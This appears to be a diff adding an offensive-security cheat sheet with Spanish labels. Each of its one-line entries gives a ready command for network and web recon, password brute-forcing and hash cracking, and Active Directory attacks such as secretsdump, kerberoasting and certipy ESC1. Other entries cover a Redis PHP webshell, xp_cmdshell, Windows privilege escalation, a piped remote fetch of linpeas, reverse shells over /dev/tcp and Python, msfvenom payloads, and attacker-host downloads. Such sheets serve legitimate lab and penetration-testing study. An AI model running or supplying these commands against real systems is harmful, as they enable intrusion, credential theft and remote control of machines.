@@ -1,0 +1,82 @@
+nmap tcp rapido | nmap -p- --open --min-rate 5000 -Pn -n -sS <IP> -oN tcp.txt
+nmap detallado | nmap -p<PORTS> -sCV -Pn <IP> -oN detail.txt
+nmap udp | nmap -sU --top-ports 50 --open --min-rate 5000 -Pn -n <IP>
+nmap vuln | nmap -p<PORTS> --script vuln -Pn <IP>
+gobuster dirs | gobuster dir -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt -t 50
+gobuster vhosts | gobuster vhost -u http://<DOMAIN> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
+ffuf dirs | ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://<IP>/FUZZ -t 50
+ffuf params | ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "http://<IP>/page?FUZZ=test" -fs <SIZE>
+feroxbuster | feroxbuster -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt
+nikto | nikto -h http://<IP>
+whatweb | whatweb http://<IP>
+wpscan | wpscan --url http://<IP> -e ap,at,u
+wpscan brute | wpscan --url http://<IP> -U admin -P /usr/share/wordlists/rockyou.txt
+hydra ssh | hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ssh://<IP>
+hydra ftp | hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ftp://<IP>
+hydra http post | hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"
+hashcat ntlm | hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
+hashcat ntlmv2 | hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+hashcat kerberoast | hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
+hashcat asrep | hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
+john crack | john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+ssh2john | ssh2john id_rsa > hash.txt && john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+smbclient null | smbclient -L //<IP>/ -N
+smbmap | smbmap -H <IP>
+smbmap creds | smbmap -H <IP> -u 'user' -p 'pass'
+enum4linux | enum4linux-ng <IP>
+rpcclient null | rpcclient -U '' -N <IP> → enumdomusers / enumdomgroups
+snmp enum | onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt <IP>
+snmpwalk | snmpwalk -v2c -c public <IP> .
+snmpwalk users | snmpwalk -v2c -c public <IP> 1.3.6.1.4.1.77.1.2.25
+snmpwalk procesos | snmpwalk -v2c -c public <IP> hrSWRunParameters
+ldapsearch anon | ldapsearch -x -H ldap://<IP> -s base namingcontexts
+ldapsearch dump | ldapsearch -x -H ldap://<IP> -D 'user@domain.local' -w 'pass' -b "DC=domain,DC=local"
+nfs showmount | showmount -e <IP>
+nfs mount | mount -t nfs <IP>:/share /tmp/nfs -o nolock
+redis connect | redis-cli -h <IP>
+redis webshell | CONFIG SET dir /var/www/html/ → CONFIG SET dbfilename shell.php → SET p '<?php system($_GET["cmd"]); ?>' → SAVE
+mssql connect | impacket-mssqlclient user:pass@<IP> -windows-auth
+mssql xpcmdshell | EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami';
+mssql hash capture | EXEC xp_dirtree '\\<ATTACKER_IP>\share',1,1; (con responder escuchando)
+responder | sudo responder -I tun0
+evil-winrm | evil-winrm -i <IP> -u user -p 'pass'
+evil-winrm hash | evil-winrm -i <IP> -u user -H <NTLM_HASH>
+psexec | impacket-psexec domain.local/user:'pass'@<IP>
+wmiexec | impacket-wmiexec domain.local/user:'pass'@<IP>
+secretsdump | impacket-secretsdump domain.local/admin:'pass'@<DC_IP>
+secretsdump hash | impacket-secretsdump domain.local/admin@<DC_IP> -hashes :<NTLM>
+kerberoast | impacket-GetUserSPNs domain.local/user:pass -dc-ip <DC_IP> -request
+asrep roast | impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip <DC_IP> -no-pass
+bloodhound collect | bloodhound-python -d domain.local -u user -p pass -ns <DC_IP> -c All
+certipy find | certipy find -u user@domain.local -p pass -dc-ip <DC_IP> -vulnerable
+certipy esc1 | certipy req -u user@domain.local -p pass -ca <CA> -template <TPL> -upn administrator@domain.local
+certipy auth | certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
+password spray | crackmapexec smb <DC_IP> -u users.txt -p 'Password1!' -d domain.local --continue-on-success
+sudo -l | sudo -l → buscar en gtfobins.github.io
+find suid | find / -perm -4000 -type f 2>/dev/null
+find capabilities | getcap -r / 2>/dev/null
+find crontabs | cat /etc/crontab && ls -la /etc/cron.* && crontab -l
+find writable | find / -writable -type f 2>/dev/null | grep -v proc
+linpeas | curl http://<ATTACKER>/linpeas.sh | bash
+pspy | ./pspy64
+winpeas | .\winPEASany.exe
+whoami priv | whoami /priv → SeImpersonatePrivilege → GodPotato/PrintSpoofer
+godpotato | .\GodPotato-NET4.exe -cmd "cmd /c <REVERSE_SHELL>"
+printspoofer | .\PrintSpoofer64.exe -i -c cmd
+chisel socks | server: ./chisel server --reverse --port 8888 → victim: ./chisel client <IP>:8888 R:socks
+ligolo setup | sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up
+php reverse shell | <?php system($_GET['cmd']); ?>
+python reverse shell | python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
+bash reverse shell | bash -i >& /dev/tcp/<IP>/4444 0>&1
+shell upgrade tty | python3 -c 'import pty;pty.spawn("/bin/bash")' → Ctrl+Z → stty raw -echo;fg → export TERM=xterm
+msfvenom linux | msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o shell.elf
+msfvenom windows | msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell.exe
+msfvenom war | msfvenom -p java/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war -o shell.war
+msfvenom msi | msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o shell.msi
+http server python | python3 -m http.server 80
+http server smb | impacket-smbserver share . -smb2support
+wget linux | wget http://<ATTACKER>/file
+curl linux | curl http://<ATTACKER>/file -o file
+certutil windows | certutil -urlcache -split -f http://<ATTACKER>/file C:\Windows\Temp\file
+powershell download | iwr http://<ATTACKER>/file -o file
+dns zone transfer | dig axfr @<IP> <DOMAIN>
